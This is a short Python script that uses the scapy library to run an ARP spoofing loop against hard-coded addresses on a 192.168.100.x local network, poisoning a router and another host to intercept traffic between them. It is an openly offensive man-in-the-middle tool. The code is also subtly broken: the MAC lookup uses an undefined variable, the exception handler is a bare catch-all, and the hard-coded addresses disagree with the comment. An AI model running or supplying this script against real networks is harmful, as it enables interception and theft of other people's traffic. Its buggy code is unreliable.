#!/usr/bin/python

import scapy.all as scapy

def get_target_mac(target_ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    final_packet = broadcast/arp_request
    answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]
    mac = answer[0][1].hwsrc
    return(mac)

def spoof_arp(target_ip, spoofed_ip):
    mac = get_target_mac(target_ip)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
    scapy.send(packet, verbose=False)


def main():
    try:
        while True:
            #router=192.168.100.1 slef=192.168.100.41
            spoof_arp("192.168.100.1", "192.168.100.41")
            spoof_arp("192.168.100.41", "192.168.100.11") 
    except: KeyboardInterrupt


main()